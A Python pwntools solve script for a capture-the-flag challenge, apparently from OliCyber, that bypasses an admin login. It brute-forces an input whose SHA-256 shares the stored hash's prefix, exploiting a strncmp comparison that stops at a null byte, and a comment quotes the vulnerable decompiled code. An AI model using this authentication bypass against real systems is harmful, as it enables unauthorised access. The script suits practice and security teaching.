#!/usr/bin/env python3

from pwn import *
from hashlib import sha256

elf = ELF("./admin_panel_patched")

context.binary = elf
context.terminal = ('kgx', '-e')

def conn():
    if args.REMOTE:
        r = remote('adminpanel.challs.olicyber.it', 12200)
    elif args.GDB:
        r = gdb.debug(elf.path, '''
                                b main
                                continue
                      ''')
    else:
        r = process(elf.path)

    return r

def brute_force_psw():
    target = 'bed100'
    for i in range(0xffffffff):
        if sha256(str(i).encode()).hexdigest().startswith(target):
            print(f'Found: {i} -> {sha256(str(i).encode()).hexdigest()}')
            return str(i)

def main():
    psw = brute_force_psw()
    r = conn()
    r.sendlineafter(b'Esci\n', b'1')

    r.sendlineafter(b'Username: ', b'admin')
    r.sendlineafter(b'Password: ', psw.encode())
    
    r.sendlineafter(b'Esci', b'5')
    print(r.recvall(timeout=2).decode())

"""
Since the strncmp function is used to compare not the hashes as strings but their byte representation, the null byte in the hash makes the comparison stop early, allowing any password that hashes to a value starting with the same bytes to be accepted.
if ( !strncmp(hash_db_bytes, hash_input_bytes, 0x20u) )
      {
        printf("Login con successo per l'utente %s\n", username);
        strncpy(dest, s1, 0x3Fu);
        global_user = strcmp(s1, "admin") == 0;
      }

admin:bed1004317f63a8045fb00f9f6b2e3dd09154e5cfaead1ef33a39432d6a48df8
"""

if __name__ == "__main__":
    main()
